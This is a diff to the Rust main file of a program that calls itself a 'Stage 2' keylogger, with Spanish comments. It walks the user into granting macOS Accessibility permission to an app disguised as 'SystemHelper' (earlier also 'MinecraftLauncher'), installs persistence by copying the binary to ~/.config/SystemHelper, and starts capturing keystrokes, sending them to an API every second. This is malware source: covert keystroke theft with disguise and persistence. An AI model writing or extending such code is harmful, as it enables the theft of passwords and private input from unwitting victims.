@@ -9,13 +9,12 @@ use std::sync::Arc;
 use std::thread::sleep;
 use std::time::Duration;
 
-// === Módulo para permisos de Accesibilidad en macOS ===
+// === Módulo para permisos de Accesibilidad ===
 #[cfg(target_os = "macos")]
 mod macos_permission {
-    // Enlazar con el framework ApplicationServices de macOS
     #[link(name = "ApplicationServices", kind = "framework")]
     extern "C" {
-        fn AXIsProcessTrusted() -> u8; // Devuelve 1 si tiene permiso, 0 si no
+        fn AXIsProcessTrusted() -> u8;
     }
 
     pub fn is_trusted() -> bool {
@@ -32,17 +31,16 @@ mod macos_permission {
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!("🔐 Stage 2 - Keylogger iniciado");
 
-    // === SOLICITAR PERMISOS DE ACCESIBILIDAD (macOS) ===
+    // 1. Solicitar permisos de Accesibilidad (macOS)
     #[cfg(target_os = "macos")]
     {
-        // Verificar si ya tiene permisos
         let trusted = macos_permission::is_trusted();
         println!("📌 Estado actual de Accesibilidad: {}", if trusted { "✅ Concedido" } else { "❌ No concedido" });
 
         if !trusted {
             println!("🔐 Esta aplicación necesita permisos de Accesibilidad.");
             println!("📌 Se abrirá Preferencias del Sistema para que los actives.");
-            println!("👉 Activa 'SystemHelper' o 'MinecraftLauncher' en Accesibilidad.");
+            println!("👉 Activa 'SystemHelper' en Accesibilidad.");
             println!("⚠️  Después de activarlo, la aplicación continuará automáticamente.");
 
             macos_permission::open_accessibility_preferences();
@@ -59,19 +57,18 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         }
     }
 
-    // 1. INSTALAR PERSISTENCIA
+    // 2. Instalar persistencia (esto copia el binario a ~/.config/SystemHelper)
     println!("📌 Llamando a persistence::install()...");
     match persistence::install() {
         Ok(_) => println!("✅ persistence::install() completado correctamente"),
         Err(e) => println!("❌ persistence::install() falló: {}", e),
     }
 
-    // 2. Iniciar keylogger
+    // 3. Iniciar keylogger
     let api_client = Arc::new(ApiClient::new("http://localhost:8080"));
     println!("⌨️  Keylogger activo - presiona teclas");
-    println!("📤 Las teclas se enviarán a la API cada {} segundos.", 30);
+    println!("📤 Las teclas se enviarán a la API cada 1 segundo.");
 
-    // Ejecutar el keylogger y capturar errores para mostrarlos
     if let Err(e) = keylogger::start(api_client) {
         eprintln!("❌ Error en el keylogger: {}", e);
         return Err(e);
